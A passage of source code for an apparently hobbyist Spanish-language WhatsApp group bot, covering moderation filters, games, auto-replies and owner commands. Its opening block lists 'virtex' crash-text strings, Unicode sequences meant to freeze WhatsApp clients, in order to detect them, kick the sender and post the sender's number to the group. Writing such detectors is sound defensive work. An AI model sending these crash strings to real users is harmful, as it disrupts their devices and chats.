if (budy.includes('๒๒๒๒') || budy.includes('ดุ') || budy.includes('ผิดุท้เึางืผิดุท้เึางื') || budy.includes('๑๑๑๑๑๑๑๑') || budy.includes('৭৭৭৭৭৭৭৭') || budy.includes('   ⃢   ⃢   ⃢  ') || budy.includes('*⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃟⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢⃟⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢⃟⃟ᡃ⃟ᡃ⃟ᡃ⃢ᡃ⃢ᡃ⃢⃟⃢⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃟⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢⃟⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢⃟⃟ᡃ⃟ᡃ⃟ᡃ⃢ᡃ⃢ᡃ⃢⃟⃢⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃟⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢⃟⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢⃟⃟ᡃ⃟ᡃ⃟ᡃ⃢ᡃ⃢ᡃ⃢⃟⃢⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟') || budy.includes('ผดิทุเ้ึางผืดิทุเ้') || budy.includes('.*࡞ࣰࣰࣰࣲࣲࣲࣲࣩࣩࣩࣩࣶࣶ࣯࣯࣮࣮ࣦ࣯ࣨࣨࣨࣻࣻࣻࣼࣼࣼࣽࣽࣾࣷࣵࣴ࣬࣬࣬ࣤࣤࣧࣧ*') || budy.includes('᥋') || budy.includes('؁') || budy.includes('ٯٯٯٯٯ') ) {
if (isGroupAdmins) return replygc('*VIRTEX DETECTED*')
console.log(color('[KICK]', 'red'), color('Received a virus text!', 'yellow'))
SenseiOfc.sendText(m.chat, `*MARK AS READ*\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n *Virus sender here👇:* \nwa.me/${sender.split("@")[0]}`)   
if (!isBotAdmins) return
if(TheCreator) return
SenseiOfc.groupParticipantsUpdate(from, [sender], 'remove')
await SenseiOfc.sendMessage(from, { delete: { remoteJid: m.chat, fromMe: false, id: m.key.id, participant: m.key.participant }})
SenseiOfc.sendMessage(`${ownernumber}@s.whatsapp.net`,{text: `Hi Owner! wa.me/${sender.split("@")[0]} Detected Having Sent Virtex ${isGroup?`in ${groupName}`:''}`})
 }
 }
 
 if (db.data.chats[m.chat].antibot) {
    if (m.isBaileys && m.fromMe == false){
        if (isAdmin || !isBotAdmin){		  
        } else {
          replygc(`*Otro Bot Detectado*\n\n¡Hushhh, aléjate de este grupo!`)
    return await SenseiOfc.groupParticipantsUpdate(m.chat, [m.sender], 'remove')
        }
    }
   }
 
        //anti media
        if (db.data.chats[m.chat].antimedia && isMedia) {
        if (TheCreator || isAdmins || !isBotAdmins){		  
        } else {
          replygc(`\`\`\`「 Media Detected 」\`\`\`\n\nLo siento, pero tengo que borrarlo, porque el admin/propietario ha activado el anti-media para este grupo`)
    return SenseiOfc.sendMessage(m.chat, { delete: { remoteJid: m.chat, fromMe: false, id: m.key.id, participant: m.key.participant }})
        }
  }
        if (db.data.chats[m.chat].image && isErikMedia) {
    if(isErikMedia === "imageMessage"){
        if (TheCreator || isAdmins || !isBotAdmins){		  
        } else {
          replygc(`\`\`\`「 Image Detected 」\`\`\`\n\nLo siento, pero tengo que borrarlo, porque el admin/propietario ha activado el anti-imagen para este grupo`)
    return SenseiOfc.sendMessage(m.chat, { delete: { remoteJid: m.chat, fromMe: false, id: m.key.id, participant: m.key.participant }})
        }
    }
  }
        if (db.data.chats[m.chat].antivideo && isErikMedia) {
    if(isErikMedia === "videoMessage"){
        if (TheCreator || isAdmins || !isBotAdmins){		  
        } else {
          replygc(`\`\`\`「 Video Detected 」\`\`\`\n\nLo siento, pero tengo que borrarlo, porque el admin/propietario ha activado el anti-video para este grupo`)
    return SenseiOfc.sendMessage(m.chat, { delete: { remoteJid: m.chat, fromMe: false, id: m.key.id, participant: m.key.participant }})
        }
    }
  }
        if (db.data.chats[m.chat].antisticker && isErikMedia) {
    if(isErikMedia === "stickerMessage"){
        if (TheCreator || isAdmins || !isBotAdmins){		  
        } else {
          replygc(`\`\`\`「 Sticker Detected 」\`\`\`\n\nLo siento, pero tengo que borrarlo, porque el admin/propietario ha activado el anti-sticker para este grupo`)
    return SenseiOfc.sendMessage(m.chat, { delete: { remoteJid: m.chat, fromMe: false, id: m.key.id, participant: m.key.participant }})
        }
    }
  }
        if (db.data.chats[m.chat].antiaudio && isErikMedia) {
    if(isErikMedia === "audioMessage"){
        if (TheCreator || isAdmins || !isBotAdmins){		  
        } else {
          replygc(`\`\`\`「 Audio Detected 」\`\`\`\n\nLo siento, pero tengo que borrarlo, porque el admin/propietario ha activado el anti-audio para este grupo`)
    return SenseiOfc.sendMessage(m.chat, { delete: { remoteJid: m.chat, fromMe: false, id: m.key.id, participant: m.key.participant }})
        }
    }
  }
       if (db.data.chats[m.chat].antipoll && isErikMedia) {
    if(isErikMedia === "pollCreationMessage"){
        if (TheCreator || isAdmins || !isBotAdmins){		  
        } else {
          replygc(`\`\`\`「 Poll Detected 」\`\`\`\n\nLo siento, pero tengo que borrarlo, porque el admin/propietario ha activado el anti-encuesta para este grupo`)
    return SenseiOfc.sendMessage(m.chat, { delete: { remoteJid: m.chat, fromMe: false, id: m.key.id, participant: m.key.participant }})
        }
    }
  }
       if (db.data.chats[m.chat].antilocation && isErikMedia) {
    if(isErikMedia === "locationMessage"){
        if (TheCreator || isAdmins || !isBotAdmins){		  
        } else {
          replygc(`\`\`\`「 Location Detected 」\`\`\`\n\nLo siento, pero tengo que borrarlo, porque el admin/propietario ha activado el anti-ubicación para este grupo`)
    return SenseiOfc.sendMessage(m.chat, { delete: { remoteJid: m.chat, fromMe: false, id: m.key.id, participant: m.key.participant }})
        }
    }
  }
       if (db.data.chats[m.chat].antidocument && isErikMedia) {
    if(isErikMedia === "documentMessage"){
        if (TheCreator || isAdmins || !isBotAdmins){		  
        } else {
          replygc(`\`\`\`「 Document Detected 」\`\`\`\n\nLo siento, pero tengo que eliminarlo porque el administrador/propietario ha activado el anti-documento para este grupo.`)
    return SenseiOfc.sendMessage(m.chat, { delete: { remoteJid: m.chat, fromMe: false, id: m.key.id, participant: m.key.participant }})
        }
    }
  }
      if (db.data.chats[m.chat].anticontact && isErikMedia) {
    if(isErikMedia === "contactMessage"){
        if (TheCreator || isAdmins || !isBotAdmins){		  
        } else {
          replygc(`\`\`\`「 Contact Detected 」\`\`\`\n\nLo siento, pero tengo que borrarlo, porque el admin/propietario ha activado el anti-contacto para este grupo`)
    return SenseiOfc.sendMessage(m.chat, { delete: { remoteJid: m.chat, fromMe: false, id: m.key.id, participant: m.key.participant }})
        }
    }
  }
        //respond
        if (db.data.chats[m.chat].badword) {
    for (let bak of malasPalabras) {
       if (budy === bak) {
          let malUsuario = await db.data.users[remite].palabrasOfensivas;
          SenseiOfc.sendMessage(m.chat,
		    {
		        delete: {
		            remoteJid: m.chat,
		            fromMe: false,
		            id: m.key.id,
		            participant: m.key.participant
		        }
		    })
		SenseiOfc.sendMessage(from, {text:`\`\`\`「 Palabra Ofensiva Detectada 」\`\`\`\n\n@${m.sender.split("@")[0]} estaba usando palabras fuertes y su mensaje ha sido eliminado`, contextInfo:{mentionedJid:[m.sender]}}, {quoted:m})
       }
    }
}
        //autosticker
        if (db.data.settings[botNumber].autosticker) {
        	if (m.key.fromMe) return
            if (/image/.test(mime) && !/webp/.test(mime)) {
                let mediac = await quoted.download()
                SenseiOfc.sendImageAsSticker(from, mediac, m, { packname: global.packname, author: global.author })
                console.log(`Auto sticker detected`)
            } else if (/video/.test(mime)) {
                if ((quoted.msg || quoted).seconds > 11) return
                let mediac = await quoted.download()
                SenseiOfc.sendVideoAsSticker(from, mediac, m, { packname: global.packname, author: global.author })
            }
        }
        
        if (db.data.chats[m.chat].antilinkgc) {
    if (budy.match(`chat.whatsapp.com`)) {
        bvl = `\`\`\`「 Enlace de Grupo Detectado 」\`\`\`\n\nEl administrador ha enviado un enlace de grupo, el administrador tiene permiso para enviar cualquier enlace 😇`
        if (isAdmins) return replygc(bvl)
        if (m.key.fromMe) return replygc(bvl)
        if (TheCreator) return replygc(bvl)
        await SenseiOfc.sendMessage(m.chat,
            {
                delete: {
                    remoteJid: m.chat,
                    fromMe: false,
                    id: m.key.id,
                    participant: m.key.participant
                }
            })
        SenseiOfc.sendMessage(from, {text:`\`\`\`「 Enlace de Grupo Detectado 」\`\`\`\n\n@${m.sender.split("@")[0]} ha enviado un enlace y se ha eliminado correctamente`, contextInfo:{mentionedJid:[m.sender]}}, {quoted:m})
    }
}
if (db.data.chats[m.chat].antilink) {
    if (budy.match('http') && budy.match('https')) {
        bvl = `\`\`\`「 Enlace Detectado 」\`\`\`\n\nEl administrador ha enviado un enlace, el administrador tiene permiso para enviar cualquier enlace 😇`
        if (isAdmins) return replygc(bvl)
        if (m.key.fromMe) return replygc(bvl)
        if (TheCreator) return replygc(bvl)
        await SenseiOfc.sendMessage(m.chat,
            {
                delete: {
                    remoteJid: m.chat,
                    fromMe: false,
                    id: m.key.id,
                    participant: m.key.participant
                }
            })
        SenseiOfc.sendMessage(from, {text:`\`\`\`「 Enlace Detectado 」\`\`\`\n\n@${m.sender.split("@")[0]} ha enviado un enlace y se ha eliminado correctamente`, contextInfo:{mentionedJid:[m.sender]}}, {quoted:m})
    }
}
       // AFK
let mentionUser = [...new Set([...(m.mentionedJid || []), ...(m.quoted ? [m.quoted.sender] : [])])]
for (let jid of mentionUser) {
    let user = db.data.users[jid]
    if (!user) continue
    let afkTime = user.afkTime
    if (!afkTime || afkTime < 0) continue
    let reason = user.afkReason || ''
    replygc(`Por favor, no lo etiquetes. Está AFK ${reason ? 'con motivo ' + reason : 'sin motivo'}\nAFK desde ${clockString(new Date - afkTime)}`.trim())
}
if (db.data.users[m.sender].afkTime > -1) {
    let user = global.db.data.users[m.sender]
    replygc(`Has vuelto del AFK\nMotivo del AFK: ${user.afkReason ? user.afkReason : ''}\nDuración del AFK: ${clockString(new Date - user.afkTime)}`.trim())
    user.afkTime = -1
    user.afkReason = ''
}

        
//total features
const xeonfeature = () =>{
            var mytext = fs.readFileSync("./XeonCheems10.js").toString()
            var numUpper = (mytext.match(/case '/g) || []).length
            return numUpper
        }
        //autoreply
for (let BhosdikaXeon of VoiceNote) {
if (budy === BhosdikaXeon) {
let audiobuffy = fs.readFileSync(`./Media/audio/${BhosdikaXeon}.mp3`)
SenseiOfc.sendMessage(m.chat, { audio: audiobuffy, mimetype: 'audio/mp4', ptt: true }, { quoted: m })     
}
}
for (let BhosdikaXeon of Sticker){
if (budy === BhosdikaXeon){
let stickerbuffy = fs.readFileSync(`./Media/sticker/${BhosdikaXeon}.webp`)
SenseiOfc.sendMessage(m.chat, { sticker: stickerbuffy }, { quoted: m })
}
}
for (let BhosdikaXeon of Image){
if (budy === BhosdikaXeon){
let imagebuffy = fs.readFileSync(`./Media/image/${BhosdikaXeon}.jpg`)
SenseiOfc.sendMessage(m.chat, { image: imagebuffy }, { quoted: m })
}
}
for (let BhosdikaXeon of Video){
if (budy === BhosdikaXeon){
let videobuffy = fs.readFileSync(`./Media/video/${BhosdikaXeon}.mp4`)
SenseiOfc.sendMessage(m.chat, { video: videobuffy }, { quoted: m })
}
}

const sendapk = (teks) => {
SenseiOfc.sendMessage(from, { document: teks, mimetype: 'application/vnd.android.package-archive'}, {quoted:m})
}
for (let BhosdikaXeon of Apk) {
if (budy === BhosdikaXeon) {
let buffer = fs.readFileSync(`./Media/apk/${BhosdikaXeon}.apk`)
sendapk(buffer)
}
}

const sendzip = (teks) => {
SenseiOfc.sendMessage(from, { document: teks, mimetype: 'application/zip'}, {quoted:m})
}
for (let BhosdikaXeon of Zip) {
if (budy === BhosdikaXeon) {
let buffer = fs.readFileSync(`./Media/zip/${BhosdikaXeon}.zip`)
sendzip(buffer)
}
}

const senddocu = (teks) => {
SenseiOfc.sendMessage(from, { document: teks, mimetype: 'application/pdf'}, {quoted:m})
}
for (let BhosdikaXeon of Doc) {
if (budy === BhosdikaXeon) {
let buffer = fs.readFileSync(`./Media/doc/${BhosdikaXeon}.pdf`)
senddocu(buffer)
}
}

// Respon Cmd with media
if (isMedia && m.msg.fileSha256 && (m.msg.fileSha256.toString('base64') in global.db.data.sticker)) {
let hash = global.db.data.sticker[m.msg.fileSha256.toString('base64')]
let { text, mentionedJid } = hash
let messages = await generateWAMessage(m.chat, { text: text, mentions: mentionedJid }, {
    userJid: SenseiOfc.user.id,
    quoted: m.quoted && m.quoted.fakeObj
})
messages.key.fromMe = areJidsSameUser(m.sender, SenseiOfc.user.id)
messages.key.id = m.key.id
messages.pushName = m.pushName
if (m.isGroup) messages.participant = m.sender
let msg = {
    ...chatUpdate,
    messages: [proto.WebMessageInfo.fromObject(messages)],
    type: 'append'
}
SenseiOfc.ev.emit('messages.upsert', msg)
}

//matemáticas
if (kuismath.hasOwnProperty(m.sender.split('@')[0]) && isCmd2) {
	if (m.key.fromMe) return
            kuis = true
            jawaban = kuismath[m.sender.split('@')[0]]
            if (budy.toLowerCase() == jawaban) {
                await replygc(`🎮 Quiz de Matemáticas 🎮\n\nRespuesta Correcta 🎉\n\n¿Quieres jugar de nuevo? Envía ${prefix}math mode`)
                delete kuismath[m.sender.split('@')[0]]
            } else replygc('*¡Respuesta Incorrecta!*')
        }
        
        //juego
        this.game = this.game ? this.game : {}
        let room = Object.values(this.game).find(room => room.id && room.game && room.state && room.id.startsWith('tictactoe') && [room.game.playerX, room.game.playerO].includes(m.sender) && room.state == 'PLAYING')
        if (room) {
            let ok
            let isWin = !1
            let isTie = !1
            let isRendirse = !1
            if (!/^([1-9]|(me)?rendirse|surr?ender|off|skip)$/i.test(m.text)) return
            isRendirse = !/^[1-9]$/.test(m.text)
            if (m.sender !== room.game.currentTurn) {
                if (!isRendirse) return !0
            }
            if (!isRendirse && 1 > (ok = room.game.turn(m.sender === room.game.playerO, parseInt(m.text) - 1))) {
                replygc({
                    '-3': 'El juego ha terminado',
                    '-2': 'Inválido',
                    '-1': 'Posición inválida',
                    0: 'Posición inválida',
                } [ok])
                return !0
            }
            if (m.sender === room.game.winner) isWin = true
            else if (room.game.board === 511) isTie = true
            let arr = room.game.render().map(v => {
                return {
                    X: '❌',
                    O: '⭕',
                    1: '1️⃣',
                    2: '2️⃣',
                    3: '3️⃣',
                    4: '4️⃣',
                    5: '5️⃣',
                    6: '6️⃣',
                    7: '7️⃣',
                    8: '8️⃣',
                    9: '9️⃣',
                } [v]
            })
            if (isSurrender) {
                room.game._currentTurn = m.sender === room.game.playerX
                isWin = true
            }
            let winner = isRendirse ? room.game.currentTurn : room.game.winner
            let str = `ID de la sala: ${room.id}

${arr.slice(0, 3).join('')}
${arr.slice(3, 6).join('')}
${arr.slice(6).join('')}

${isWin ? `@${winner.split('@')[0]} ¡Ganó!` : isTie ? `Juego terminado` : `Turno ${['❌', '⭕'][1 * room.game._currentTurn]} (@${room.game.currentTurn.split('@')[0]})`}
❌: @${room.game.playerX.split('@')[0]}
⭕: @${room.game.playerO.split('@')[0]}

Escribe *rendirse* para rendirte y admitir la derrota`
            if ((room.game._currentTurn ^ isRendirse ? room.x : room.o) !== m.chat)
                room[room.game._currentTurn ^ isRendirse ? 'x' : 'o'] = m.chat
            if (room.x !== room.o) SenseiOfc.sendText(room.x, str, m, {
                mentions: parseMention(str)
            })
            SenseiOfc.sendText(room.o, str, m, {
                mentions: parseMention(str)
            })
            if (isTie || isWin) {
                delete this.game[room.id]
            }
        }
        
        //Suit PvP
	    this.suit = this.suit ? this.suit : {}
let roof = Object.values(this.suit).find(roof => roof.id && roof.status && [roof.p, roof.p2].includes(m.sender))
if (roof) {
    let win = ''
    let tie = false
    if (m.sender == roof.p2 && /^(acc(ept)?|aceptar|yes|okay?|reject|no|later|nop(e.)?yes|y)/i.test(m.text) && m.isGroup && roof.status == 'wait') {
        if (/^(rechazar|no|later|n|nop(e.)?yes)/i.test(m.text)) {
            SenseiOfc.sendTextWithMentions(m.chat, `@${roof.p2.split`@`[0]} rechazó el traje, el traje se cancela`, m)
            delete this.suit[roof.id]
            return !0
        }
        roof.status = 'play'
        roof.asal = m.chat
        clearTimeout(roof.waktu)
        //delete roof[roof.id].waktu
        SenseiOfc.sendText(m.chat, `El juego de Piedra, Papel o Tijeras se ha enviado al chat

@${roof.p.split`@`[0]} y 
@${roof.p2.split`@`[0]}

Por favor, elijan una opción en el chat respectivo"
Hacer clic en https://wa.me/${botNumber.split`@`[0]}`, m, { mentions: [roof.p, roof.p2] })
        if (!roof.pilih) SenseiOfc.sendText(roof.p, `Por favor, elige \n\🗿 Piedra\n📄 Papel\n✂️ Tijeras`, m)
        if (!roof.pilih2) SenseiOfc.sendText(roof.p2, `Por favor, elige \n\n🗿 Piedra\n📄 Papel\n✂️ Tijeras`, m)
        roof.waktu_milih = setTimeout(() => {
            if (!roof.pilih && !roof.pilih2) SenseiOfc.sendText(m.chat, `Ambos jugadores no quieren jugar. Juego cancelado`)
            else if (!roof.pilih || !roof.pilih2) {
                win = !roof.pilih ? roof.p2 : roof.p
                SenseiOfc.sendTextWithMentions(m.chat, `@${(roof.pilih ? roof.p2 : roof.p).split`@`[0]} No eligió una opción. Fin del juego.`, m)
            }
            delete this.suit[roof.id]
            return !0
        }, roof.timeout)
    }
    let jwb = m.sender == roof.p
    let jwb2 = m.sender == roof.p2
    let g = /tijera/i
    let b = /piedra/i
    let k = /papel/i
    let reg = /^(tijera|piedra|papel)/i
    if (jwb && reg.test(m.text) && !roof.pilih && !m.isGroup) {
        roof.pilih = reg.exec(m.text.toLowerCase())[0]
        roof.text = m.text
        replygc(`Has elegido ${m.text} ${!roof.pilih2 ? `\n\nEsperando a que el oponente elija` : ''}`)
        if (!roof.pilih2) SenseiOfc.sendText(roof.p2, '_El oponente ha elegido_\nAhora es tu turno', 0)
    }
    if (jwb2 && reg.test(m.text) && !roof.pilih2 && !m.isGroup) {
        roof.pilih2 = reg.exec(m.text.toLowerCase())[0]
        roof.text2 = m.text
        replygc(`Has elegido ${m.text} ${!roof.pilih ? `\n\nEsperando a que el oponente elija` : ''}`)
        if (!roof.pilih) SenseiOfc.sendText(roof.p, '_El oponente ha elegido_\nAhora es tu turno', 0)
    }
    let stage = roof.pilih
    let stage2 = roof.pilih2
    if (roof.pilih && roof.pilih2) {
        clearTimeout(roof.waktu_milih)
        if (b.test(stage) && g.test(stage2)) win = roof.p
        else if (b.test(stage) && k.test(stage2)) win = roof.p2
        else if (g.test(stage) && k.test(stage2)) win = roof.p
        else if (g.test(stage) && b.test(stage2)) win = roof.p2
        else if (k.test(stage) && b.test(stage2)) win = roof.p
        else if (k.test(stage) && g.test(stage2)) win = roof.p2
        else if (stage == stage2) tie = true
        SenseiOfc.sendText(roof.asal, `_*Resultados del juego de Piedra, Papel o Tijeras*_ ${tie ? '\nSERIE' : ''}

@${roof.p.split`@`[0]} (${roof.text}) ${tie ? '' : roof.p == win ? ` Ganó \n` : ` Perdió \n`}
@${roof.p2.split`@`[0]} (${roof.text2}) ${tie ? '' : roof.p2 == win ? ` Ganó \n` : ` Perdió  \n`}
`.trim(), m, { mentions: [roof.p, roof.p2] })
        delete this.suit[roof.id]
    }
}
 //end
        
        //user db
        if (isCommand && !isUser) {
verifieduser.push(sender)
fs.writeFileSync('./src/data/role/user.json', JSON.stringify(verifieduser, null, 2))
}
async function translateToSpanish(text) {
    const response = await axios.get(`https://api.popcat.xyz/translate?to=es&text=${encodeURIComponent(text)}`)
    return response.data.translated;
}
        
        switch (isCommand) {
            case 'addbadword':
    case 'addbd':
        if (!TheCreator) return StickOwner()
        if (!groupAdmins) return replygc(mess.admin)
        if (args.length < 1) return replygc(`Envía el comando ${prefix}addbadword [palabra ofensiva]. Ejemplo: ${prefix}addbadword imbécil`)
        bad.push(q)
        fs.writeFileSync('./src/data/function/badword.json', JSON.stringify(bad))
        replygc('¡Palabra ofensiva añadida exitosamente!')
        break

    case 'delbadword':
    case 'deldb':
        if (!TheCreator) return StickOwner()
        if (!groupAdmins) return replygc(mess.admin)
        if (args.length < 1) return replygc(`Envía el comando ${prefix}delbadword [palabra ofensiva]. Ejemplo: ${prefix}delbadword imbécil`)
        bad.splice(q)
        fs.writeFileSync('./src/data/function/badword.json', JSON.stringify(bad))
        replygc('¡Palabra ofensiva eliminada exitosamente!')
        break

    case 'resetuser':
    case 'resetdbuser':
        if (!TheCreator) return StickOwner()
        let totalUsuarios = db.data.users.length
        replygc(`Se eliminaron exitosamente ${totalUsuarios} usuarios de la base de datos`)
        db.data.users = []
        break

    case 'resethit':
    case 'resettotalhit':
        if (!TheCreator) return StickOwner()
        global.db.data.settings[botNumber].totalhit = 0
        replygc(mess.done)
        break

    case 'setmenu':
        if (!TheCreator) return StickOwner()
        if (!text) return replygc(`Hay 8 menús (v1, v2, v3, v4, v5, v6, v7, v8)\nSelecciona uno\nEjemplo: ${prefix + command} v1`)
        if (text.startsWith('v')) {
            typemenu = text
            replygc(mess.done)
        } else {
            replygc(`Hay 8 menús (v1, v2, v3, v4, v5, v6, v7, v8)\nSelecciona uno\nEjemplo: ${prefix + command} v1`)
        }
        break

    case 'setreply':
        if (!TheCreator) return StickOwner()
        if (!text) return replygc(`Hay 3 respuestas (v1, v2, v3)\nSelecciona una\nEjemplo: ${prefix + command} v1`)
        if (text.startsWith('v')) {
            typereply = text
            replygc(mess.done)
        } else {
            replygc(`Hay 3 respuestas (v1, v2, v3)\nSelecciona una\nEjemplo: ${prefix + command} v1`)
        }
        break
            case 'subirestado': {
    if (!TheCreator) return StickOwner()
    if (!q) return replygc('¿Texto?')
    if (/video/.test(mime)) {
        var videosw = await SenseiOfc.downloadAndSaveMediaMessage(quoted)
        await SenseiOfc.sendMessage('status@broadcast', {
            video: {
                url: videosw
            },
            caption: q ? q : ''
        }, { statusJidList: Object.keys(global.db.data.users) })
        await replygc(mess.done)
    } else if (/image/.test(mime)) {
        var imagesw = await SenseiOfc.downloadAndSaveMediaMessage(quoted)
        await SenseiOfc.sendMessage('status@broadcast', {
            image: {
                url: imagesw
            },
            caption: q ? q : ''
        }, { statusJidList: Object.keys(global.db.data.users)})
        await replygc(mess.done)
    } else if (/audio/.test(mime)) {
        var audiosw = await SenseiOfc.downloadAndSaveMediaMessage(quoted)
        await SenseiOfc.sendMessage('status@broadcast', {
            audio: {
                url: audiosw
            },
            mimetype: 'audio/mp4',
            ptt: true
        }, {
            backgroundColor: '#FF000000',
            statusJidList: Object.keys(global.db.data.users)
        })
        await replygc(mess.done)
    } else {
        await SenseiOfc.sendMessage('status@broadcast', { text: q }, { backgroundColor: '#FF000000', font: 3, statusJidList: Object.keys(global.db.data.users) })
        replygc(mess.done)
    }
}
break
case 'setimgmenu':
case 'sim': {
    if (!TheCreator) return StickOwner()
    let delb = await SenseiOfc.downloadAndSaveMediaMessage(quoted)
    await fsx.copy(delb, './Media/theme/menu.jpg')
    fs.unlinkSync(delb)
    replygc(mess.done)
}
break
case 'setvidmenu':
case 'svm':
case 'setvgifmenu':
case 'sgm': {
    if (!TheCreator) return StickOwner()
    let delb = await SenseiOfc.downloadAndSaveMediaMessage(quoted)
    await fsx.copy(delb, './Media/theme/Cheems-bot.mp4')
    fs.unlinkSync(delb)
    replygc(mess.done)
}
break
case 'addtitle': {
    if (!TheCreator) return StickOwner()
    if (!text) return replygc(`Uso: ${prefix + command} número|título`)
    nonya = text.split('|')[0]
    titlenya = text.split('|')[1]
    let oo = `${nonya}@s.whatsapp.net`
    db.data.users[oo].title = titlenya
    await replygc(mess.done)
}
break
case 'deltitle': {
    if (!TheCreator) return StickOwner()
    if (!text) return replygc(`Uso: ${prefix + command} número`)
    nonya = text.split(',')[0]
    let oo = `${nonya}@s.whatsapp.net`
    db.data.users[oo].title = ''
    await replygc(mess.done)
}
break
case 'addlimit':
case 'givelimit': {
    if (!TheCreator) return StickOwner()
    if (!text) return replygc(`Uso: ${prefix + command} número|cantidad de límites`)
    usernya = text.split('|')[0]
    limitnya = text.split('|')[1]
    let oo = `${usernya}@s.whatsapp.net`
    db.data.users[oo].limit += limitnya
    replygc(mess.done)
}
break
case 'dellimit': {
    if (!TheCreator) return StickOwner()
    if (!text) return replygc(`Uso: ${prefix + command} número|cantidad de límites`)
    usernya = text.split('|')[0]
    limitnya = text.split('|')[1]
    if (db.data.users[usernya + '@s.whatsapp.net'].limit < limitnya) return replygc(`Su límite es menor que ${limitnya}`)
    db.data.users[usernya + '@s.whatsapp.net'].limit -= limitnya
    replygc(mess.done)
}
break
case 'addprem':
    if (!TheCreator) return StickOwner()
    if (args.length < 2)
        return replygc(`Uso: ${prefix + command} @etiqueta tiempo\n${prefix + command} número tiempo\n\nEjemplo: ${prefix + command} @etiqueta 30d`)
    if (m.mentionedJid.length !== 0) {
        for (let i = 0; i < m.mentionedJid.length; i++) {
            addPremiumUser(m.mentionedJid[0], args[1], premium)
        }
        replygc("Premium añadido con éxito")
    } else {
        addPremiumUser(args[0] + "@s.whatsapp.net", args[1], premium)
        replygc("Premium añadido con éxito")
    }
    break
case 'delprem':
    if (!TheCreator) return StickOwner()
    if (args.length < 1) return replygc(`Uso: ${prefix + command} @etiqueta\n${prefix + command} número\n\nEjemplo: ${prefix + command} 916909137213`)
    if (m.mentionedJid.length !== 0) {
        for (let i = 0; i < m.mentionedJid.length; i++) {
            premium.splice(getPremiumPosition(m.mentionedJid[i], premium), 1)
            fs.writeFileSync("./src/data/role/premium.json", JSON.stringify(premium))
        }
        replygc("Eliminación exitosa")
    } else {
        premium.splice(getPremiumPosition(args[0] + "@s.whatsapp.net", premium), 1)
        fs.writeFileSync("./src/data/role/premium.json", JSON.stringify(premium))
        replygc("Eliminación exitosa")
    }
    break
            case 'listprem': {
                if (!TheCreator) return StickOwner()
                let data = require('./src/data/role/premium.json')
                let txt = `*------「 LIST PREMIUM 」------*\n\n`
                for (let x of data) {
                    txt += `Number : ${x.id}\n`
                    txt += `Expire In: ${x.expired} ms\n`
                SenseiOfc.sendMessage(m.chat, {
                    text: txt,
                    mentions: x
                }, {
                    quoted: m
                })
                }
            }
            break
case 'addowner':
    if (!TheCreator) return StickOwner()
    if (!args[0]) return replygc(`Utiliza ${prefix+command} número\nEjemplo ${prefix+command} ${ownernumber}`)
    bnnd = q.split("|")[0].replace(/[^0-9]/g, '')
    let ceknye = await SenseiOfc.onWhatsApp(bnnd)
    if (ceknye.length == 0) return replygc(`Ingresa un número válido y registrado en WhatsApp!!!`)
    owner.push(bnnd)
    fs.writeFileSync('./src/data/role/owner.json', JSON.stringify(owner))
    replygc(`El número ${bnnd} se ha convertido en propietario!!!`)
    break
case 'delowner':
    if (!TheCreator) return StickOwner()
    if (!args[0]) return replygc(`Utiliza ${prefix+command} número\nEjemplo ${prefix+command} 916909137213`)
    ya = q.split("|")[0].replace(/[^0-9]/g, '')
    unp = owner.indexOf(ya)
    owner.splice(unp, 1)
    fs.writeFileSync('./src/data/role/owner.json', JSON.stringify(owner))
    replygc(`El número ${ya} ha sido eliminado de la lista de propietarios por el propietario!!!`)
    break
case 'listowner': {
